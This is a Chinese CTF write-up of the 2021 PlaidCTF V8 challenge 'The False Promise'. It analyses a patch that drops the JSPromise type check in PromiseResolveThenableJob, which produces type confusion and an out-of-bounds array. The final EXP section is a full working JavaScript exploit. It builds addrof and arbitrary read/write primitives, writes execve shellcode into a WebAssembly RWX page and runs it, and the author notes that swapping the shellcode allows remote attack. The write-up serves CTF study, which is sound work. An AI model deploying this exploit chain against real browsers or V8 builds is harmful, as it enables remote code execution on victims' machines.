> 原文链接: https://www.anquanke.com//post/id/239995 


# 2021 PlaidCTF-The False Promise


                                阅读量   
                                **65277**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t015527cc43ab81f3aa.jpg)](https://p4.ssl.qhimg.com/t015527cc43ab81f3aa.jpg)



## 题目分析

题目的diff文件如下：

```
diff --git a/src/builtins/promise-jobs.tq b/src/builtins/promise-jobs.tq
index 80e98f373b..ad5eb093e8 100644
--- a/src/builtins/promise-jobs.tq
+++ b/src/builtins/promise-jobs.tq
@@ -23,10 +23,8 @@ PromiseResolveThenableJob(implicit context: Context)(
   // debugger is active, to make sure we expose spec compliant behavior.
   const nativeContext = LoadNativeContext(context);
   const promiseThen = *NativeContextSlot(ContextSlot::PROMISE_THEN_INDEX);
-  const thenableMap = thenable.map;
-  if (TaggedEqual(then, promiseThen) &amp;&amp; IsJSPromiseMap(thenableMap) &amp;&amp;
-      !IsPromiseHookEnabledOrDebugIsActiveOrHasAsyncEventDelegate() &amp;&amp;
-      IsPromiseSpeciesLookupChainIntact(nativeContext, thenableMap)) `{`
+  if (TaggedEqual(then, promiseThen) &amp;&amp;
+      !IsPromiseHookEnabledOrDebugIsActiveOrHasAsyncEventDelegate()) `{`
     // We know that the `{`thenable`}` is a JSPromise, which doesn't require
     // any special treatment and that `{`then`}` corresponds to the initial
     // Promise.prototype.then method. So instead of allocating a temporary
```

可以发现`patch`去除了某些检查，导致更容易进入`if`分支并执行，很明显这是一个类型混淆的漏洞

`patch`后的完整一点的代码如下：

```
[...]
// https://tc39.es/ecma262/#sec-promiseresolvethenablejob
transitioning builtin
PromiseResolveThenableJob(implicit context: Context)(
    promiseToResolve: JSPromise, thenable: JSReceiver, then: JSAny): JSAny `{`
  // We can use a simple optimization here if we know that `{`then`}` is the
  // initial Promise.prototype.then method, and `{`thenable`}` is a JSPromise
  // whose
  // @@species lookup chain is intact: We can connect `{`thenable`}` and
  // `{`promise_to_resolve`}` directly in that case and avoid the allocation of a
  // temporary JSPromise and the closures plus context.
  //
  // We take the generic (slow-)path if a PromiseHook is enabled or the
  // debugger is active, to make sure we expose spec compliant behavior.
  const nativeContext = LoadNativeContext(context);
  const promiseThen = *NativeContextSlot(ContextSlot::PROMISE_THEN_INDEX);
  if (TaggedEqual(then, promiseThen) &amp;&amp;
      !IsPromiseHookEnabledOrDebugIsActiveOrHasAsyncEventDelegate()) `{`
    // We know that the `{`thenable`}` is a JSPromise, which doesn't require
    // any special treatment and that `{`then`}` corresponds to the initial
    // Promise.prototype.then method. So instead of allocating a temporary
    // JSPromise to connect the `{`thenable`}` with the `{`promise_to_resolve`}`,
    // we can directly schedule the `{`promise_to_resolve`}` with default
    // handlers onto the `{`thenable`}` promise. This does not only save the
    // JSPromise allocation, but also avoids the allocation of the two
    // resolving closures and the shared context.
    //
    // What happens normally in this case is
    //
    //   resolve, reject = CreateResolvingFunctions(promise_to_resolve)
    //   result_capability = NewPromiseCapability(%Promise%)
    //   PerformPromiseThen(thenable, resolve, reject, result_capability)
    //
    // which means that PerformPromiseThen will either schedule a new
    // PromiseReaction with resolve and reject or a PromiseReactionJob
    // with resolve or reject based on the state of `{`thenable`}`. And
    // resolve or reject will just invoke the default [[Resolve]] or
    // [[Reject]] functions on the `{`promise_to_resolve`}`.
    //
    // This is the same as just doing
    //
    //   PerformPromiseThen(thenable, undefined, undefined,
    //   promise_to_resolve)
    //
    // which performs exactly the same (observable) steps.
    return PerformPromiseThen(
        UnsafeCast&lt;JSPromise&gt;(thenable), UndefinedConstant(),
        UndefinedConstant(), promiseToResolve);
  [...]
```

跟进到`src/builtins/promise-abstract-operations.tq`的`PerformPromiseThen`函数

```
// https://tc39.es/ecma262/#sec-performpromisethen
transitioning builtin
PerformPromiseThen(implicit context: Context)(
    promise: JSPromise, onFulfilled: Callable|Undefined,
    onRejected: Callable|Undefined, resultPromise: JSPromise|Undefined): JSAny `{`
  PerformPromiseThenImpl(promise, onFulfilled, onRejected, resultPromise);
  return resultPromise;
`}`

@export
transitioning macro PerformPromiseThenImpl(implicit context: Context)(
    promise: JSPromise, onFulfilled: Callable|Undefined,
    onRejected: Callable|Undefined,
    resultPromiseOrCapability: JSPromise|PromiseCapability|Undefined): void `{`
    DebugBreak();
  if (promise.Status() == PromiseState::kPending) `{`
    // The `{`promise`}` is still in "Pending" state, so we just record a new
    // PromiseReaction holding both the onFulfilled and onRejected callbacks.
    // Once the `{`promise`}` is resolved we decide on the concrete handler to
    // push onto the microtask queue.
    const handlerContext = ExtractHandlerContext(onFulfilled, onRejected);
    const promiseReactions =
        UnsafeCast&lt;(Zero | PromiseReaction)&gt;(promise.reactions_or_result);
    const reaction = NewPromiseReaction(
        handlerContext, promiseReactions, resultPromiseOrCapability,
        onFulfilled, onRejected);
    promise.reactions_or_result = reaction;  &lt;--
  `}` else `{`
[...]
  promise.SetHasHandler();
`}`

```

可以发现如果我们的`thenable`不是`JSPromise`，那么在`PerformPromiseThenImpl`的时候就会将`reaction`写入`promise.reactions_or_result`中，导致可能会改变传入的`thenable`的内容

题目给的`chromium`的`commit`为`ca01b9e37ff412d2693fdcdef75812ae0bbbd386`，但是这是一个`v8`的洞，所以我们直接使用`v8`调更方便一些，`v8`的版本是`9.2.44`

我们编写如下代码进行测试：

```
var thenable = [1.1,2.2,3.3,4.4]
new Object();
thenable.then = Promise.prototype.then

var p = Promise.resolve(thenable);

%DebugPrint(p);
%DebugPrint(thenable);

function pwn () `{`
    %DebugPrint(thenable);
    %SystemBreak();
`}`
setTimeout(() =&gt; pwn() , 4);
```

> 这里的`new Object()`是为了进入`PerformPromiseThenImpl`的 `if (promise.Status() == PromiseState::kPending)`分支

我们加一个断点断在`PerformPromiseThenImpl`的开头，首先进入 `if (promise.Status() == PromiseState::kPending)`分支

[![](https://p1.ssl.qhimg.com/t0176d44f5d32c1e3ff.png)](https://p1.ssl.qhimg.com/t0176d44f5d32c1e3ff.png)

此时部分寄存器的值的含义如下

```
RAX 0x3dfb08088b1d &lt;Promise map = 0x3dfb08243091&gt;
RBX 0x3dfb080423b5 &lt;undefined&gt;
RCX 0x3dfb080423b5 &lt;undefined&gt;
RDX 0x3dfb08088a99 &lt;JSArray[4]&gt;
```

`RAX`存放的是`p`，`RDX`存放的是`thenable`

走到`reaction`生成完毕

[![](https://p4.ssl.qhimg.com/t019fd0d2a6436c70a8.png)](https://p4.ssl.qhimg.com/t019fd0d2a6436c70a8.png)

[![](https://p2.ssl.qhimg.com/t01c9ca526b7032a1dd.png)](https://p2.ssl.qhimg.com/t01c9ca526b7032a1dd.png)

再走一步可以发现`promise.reactions_or_result = reaction`语句执行完毕，`thenable`的`length`已经被修改为了`reaction`

[![](https://p5.ssl.qhimg.com/t011e6dff346d09fd49.png)](https://p5.ssl.qhimg.com/t011e6dff346d09fd49.png)

[![](https://p4.ssl.qhimg.com/t01cabb69c4ef0c6657.png)](https://p4.ssl.qhimg.com/t01cabb69c4ef0c6657.png)

这样我们便获得了一个`OOB`的数组，那么我们接下来只需要按照普通的思路进行利用即可



## EXP

由于是本地V8复现的所以就只在本地弹了个计算器，感兴趣话可以换个`shellcode`啥的就可以打远程了

```
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Int32Array(buf);

function f2i(f)`{`
    float64[0] = f;
    return bigUint64[0];
`}`

function i2f(i)`{`
    bigUint64[0] = i;
    return float64[0];
`}`

function hex(i)`{`
    return '0x' + i.toString(16).padStart(16, '0');
`}`

var thenable = [1.1,2.2,3.3,4.4]
new Object();
thenable.then = Promise.prototype.then

var p = Promise.resolve(thenable);


function pwn() `{`
    var a = new Array(0x12345678,0,1); 
    var d = [1.1,2.2]

    let idx = thenable.indexOf(i2f(0x000000002468acf0n)); 
    let element_idx = idx + 6; 
    function addrof(obj)`{`
        a[0] = obj;         
        return f2i(thenable[idx]);
    `}`

    function arb_read(addr)`{`
        thenable[element_idx] = i2f((4n &lt;&lt; 32n) + addr - 8n);
        return f2i(d[0]);
    `}`

    function arb_write(addr,data)`{`
        thenable[element_idx] = i2f((4n &lt;&lt; 32n) + addr - 8n);
        d[0] = i2f(data);
    `}`
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, `{``}`);
    var f = wasmInstance.exports.main;
    var buf = new ArrayBuffer(0x100);
    var dataview = new DataView(buf);

    var wasm_instance_addr = addrof(wasmInstance) - 1n;
    console.log("[+]leak wasm instance addr: " + hex(wasm_instance_addr));
    var rwx_page_addr = arb_read(wasm_instance_addr + 0x68n);
    console.log("[+]leak rwx_page_addr: " + hex(rwx_page_addr));

    var buf_addr = addrof(buf)  - 1n;
    var backing_store = buf_addr + 0x14n;

    var shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

    arb_write(backing_store,rwx_page_addr);

    for(var i = 0; i &lt; shellcode.length; i++) `{`
        dataview.setUint32(4 * i, shellcode[i], true);
    `}`

    f();
`}`
setTimeout(() =&gt; pwn() , 4);
```



## Reference

<a>https://hackmd.io/@aventador/BJkOOyi8u</a>
